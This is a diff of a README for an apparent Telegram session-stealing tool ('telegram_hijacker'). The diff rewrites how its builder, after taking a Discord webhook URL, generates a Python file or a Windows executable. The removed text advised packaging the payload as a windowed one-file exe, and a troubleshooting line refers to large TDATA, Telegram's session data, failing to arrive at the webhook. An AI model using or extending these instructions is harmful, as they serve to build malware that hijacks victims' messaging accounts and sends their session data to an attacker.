@@ -19,16 +19,9 @@ python builder.py
 ## Usage
 When you launch buider it will ask you to discord_webhook url
 
-If you do all right file named (generated_file.py) will build
-
-### Optional
-
-You can convert (generated_file.py) into exe with auto_py_to_exe:
-```bash
-pip install auto_py_to_exe
-python -m auto_py_to_exe
-```
-Then choose (generated_file.py) also I recommend make it --onefile and --windowed, then go to advanced find --hidden-import add discord_webhook, zip_files, shutil. Now you clear to start converting file
+Then you can choose between two options 1.build python file 2.build exe file
+If you choose first option generated_file.py need to appear in telegram_hijacker directory
+If you choose second option generated_file.exe need to appear in ~/telegram_hijacker/dist
 
 ## Problems
 ### IF YOU DONT GET MESSAGE CHECK YOUR DISCORD_WEBHOOK URL ALSO IT CAN CAUSE OF LARGE TDATA
